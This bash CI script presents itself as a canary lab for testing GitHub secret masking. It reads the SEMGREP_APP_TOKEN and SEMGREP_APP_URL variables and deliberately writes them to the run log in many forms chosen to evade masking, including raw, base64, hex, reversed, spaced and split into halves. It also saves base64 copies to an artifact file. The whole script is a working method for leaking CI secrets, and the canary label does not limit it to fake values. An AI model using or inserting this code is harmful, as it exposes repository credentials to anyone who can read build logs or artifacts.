#!/usr/bin/env bash
# ci-cred-lab canary masking matrix (CANARY values only; never run with real secrets).
# Purpose: determine which encodings of a repository secret survive GitHub log masking.
# The transformed strings are emitted to stdout (the run log) on purpose; the same
# forms are also written to out/ so the artifact-carry channel can be checked.
set -uo pipefail
O="out"
mkdir -p "$O"
CAN="${SEMGREP_APP_TOKEN:-}"
CAN2="${SEMGREP_APP_URL:-}"

if [ -z "$CAN" ]; then
  {
    echo "mode=canary_absent"
    echo "note=secret context empty on this trigger (expected on fork PRs)"
  } > "$O/mask_matrix_stdout.txt"
  cp "$O/mask_matrix_stdout.txt" "$O/artifact_carry.txt"
  echo "mask matrix: canary absent (trigger=${GITHUB_EVENT_NAME:-unknown})"
  exit 0
fi

b64() { printf '%s' "$1" | base64 -w0; }

{
  echo "--- stdcopy is what the run log receives ---"
  echo "maskform|direct|$CAN"
  echo "maskform|b64|$(b64 "$CAN")"
  echo "maskform|hex|$(printf '%s' "$CAN" | xxd -p | tr -d '\n')"
  echo "maskform|rev|$(printf '%s' "$CAN" | rev)"
  echo "maskform|spaced|$(printf '%s' "$CAN" | sed 's/./& /g' | sed 's/ $//')"
  echo "maskform|upper|$(printf '%s' "$CAN" | tr '[:lower:]' '[:upper:]')"
  echo "maskform|url|$(printf '%s' "$CAN" | jq -sRr @uri)"
  echo "maskform|sha12|$(printf '%s' "$CAN" | sha256sum | cut -c1-12)"
  echo "maskform|halves|${CAN:0:$(( ${#CAN} / 2 ))}...${CAN:$(( ${#CAN} / 2 ))}"
  echo "maskform|b64_url_secret|$(b64 "$CAN2")"
} 2>&1 | tee "$O/mask_matrix_stdout.txt"

{
  echo "mode=artifact_carry"
  echo "carry_b64=$(b64 "$CAN")"
  echo "carry_len=${#CAN}"
  echo "carry_sha12=$(printf '%s' "$CAN" | sha256sum | cut -c1-12)"
  echo "carry_url_b64=$(b64 "$CAN2")"
} > "$O/artifact_carry.txt"

echo "mask matrix complete (trigger=${GITHUB_EVENT_NAME:-unknown})"
